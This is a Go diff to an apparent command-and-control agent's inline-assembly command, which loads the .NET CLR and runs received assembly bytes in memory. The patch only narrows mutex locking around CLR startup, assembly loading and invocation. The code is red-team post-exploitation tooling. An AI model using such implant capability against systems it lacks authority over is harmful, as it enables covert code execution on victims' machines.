@@ -145,16 +145,14 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		args = strings.Fields(params.Arguments)
 	}
 
-	// Lock mutex for thread safety
-	assemblyMutex.Lock()
-	defer assemblyMutex.Unlock()
-
 	// Build output
 	var output strings.Builder
 	output.WriteString(fmt.Sprintf("[*] Received assembly: %d bytes\n", len(assemblyBytes)))
 	output.WriteString(fmt.Sprintf("[*] Arguments: %s\n", params.Arguments))
 
 	// Ensure CLR is started (Merlin approach: keep persistent runtime host)
+	// Lock only during CLR initialization
+	assemblyMutex.Lock()
 	if !clrStarted {
 		output.WriteString("[*] Starting CLR v4...\n")
 		
@@ -166,6 +164,7 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		
 		runtimeHost, err = clr.LoadCLR("v4")
 		if err != nil {
+			assemblyMutex.Unlock()
 			output.WriteString(fmt.Sprintf("[!] Error loading CLR: %v\n", err))
 			return structs.CommandResult{
 				Output:    output.String(),
@@ -176,8 +175,9 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		clrStarted = true
 		output.WriteString("[+] CLR started successfully\n")
 	}
+	assemblyMutex.Unlock()
 
-	// Send progress update
+	// Send progress update (outside of lock to avoid blocking)
 	task.Job.SendResponses <- structs.Response{
 		TaskID:     task.ID,
 		UserOutput: output.String(),
@@ -192,6 +192,8 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 	var methodInfo *clr.MethodInfo
 	var loadErr error
 	
+	// Lock only during LoadAssembly call
+	assemblyMutex.Lock()
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
@@ -201,6 +203,7 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		
 		methodInfo, loadErr = clr.LoadAssembly(runtimeHost, assemblyBytes)
 	}()
+	assemblyMutex.Unlock()
 
 	if loadErr != nil {
 		output.WriteString("\n=== LOAD ERROR ===\n")
@@ -221,7 +224,7 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 
 	output.WriteString("[+] Assembly loaded successfully\n")
 	
-	// Send progress update
+	// Send progress update (outside of lock)
 	task.Job.SendResponses <- structs.Response{
 		TaskID:     task.ID,
 		UserOutput: output.String(),
@@ -236,6 +239,8 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 	var stdout, stderr string
 	var invokeErr error
 	
+	// Lock only during InvokeAssembly call
+	assemblyMutex.Lock()
 	func() {
 		defer func() {
 			if r := recover(); r != nil {
@@ -245,6 +250,7 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 		
 		stdout, stderr = clr.InvokeAssembly(methodInfo, args)
 	}()
+	assemblyMutex.Unlock()
 
 	if invokeErr != nil {
 		output.WriteString("\n=== INVOKE ERROR ===\n")
